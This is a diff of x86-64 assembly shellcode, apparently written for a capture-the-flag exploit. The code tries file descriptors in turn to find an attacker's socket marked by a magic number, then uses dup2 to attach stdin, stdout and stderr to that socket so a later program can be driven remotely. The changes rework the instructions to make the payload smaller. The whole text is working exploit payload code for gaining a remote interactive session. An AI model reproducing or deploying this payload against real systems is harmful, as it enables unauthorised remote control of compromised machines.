@@ -16,15 +16,14 @@ global main
 	
 main:
 	mov rsi,rsp 		; TODO is this too early?
-	xor si,si 		; rsi=some valid stack address
+	and rsi,0xf0000		; rsi=some valid stack address
 
-	push byte 20	;adjust for the popularity of the ctf	
-	pop rdi
+	xor edx, edx
+	lea edi, [rdx+20]	;adjust for the popularity of the ctf	
 	
 	;; rdi is the starting fd to read from, we try each in decending order
-	push byte 4;read 4 bytes	
-	pop rdx
-		
+	mov dl, 4 ;read 4 bytes	
+	mov ebx, MAGIC	
 ourread:
 	dec rdi 	
 %ifdef DEBUG
@@ -34,23 +33,23 @@ ourread:
 %endif
 	
 .next:
-	SYSTEM_CALL(read)
+	xor eax, eax
+	mov al, read
+	syscall
 	
-	cmp al,4  		;check to see if we've received our 4 bytes
-	jnz ourread  		;if not, try with another file descriptor
-	;;TODO: lets get rid of this cmp al,4 nonsense and save some bytes.
-	cmp  [rsi], MAGIC ;this is our magic number %defined on top
+	cmp  ebx, [rsi]  ;this is our magic number %defined on top
 	jnz ourread      ; if we don't match try another file descriptor
 
 	
 	;; this dup2 code attaches stdin stdout and stderr to our socket
 	;; so that we can talk to whatever program we run later
 mydup2:
-	push byte 2
-        pop rsi
+	xor eax, eax
+	lea esi, [rax+2] ; loop count and fd
 copy_stdin_out_err:
-        SYSTEM_CALL(dup2)
-        dec rsi
+        mov al, dup2
+        syscall
+        dec esi
         jns copy_stdin_out_err	
 
 
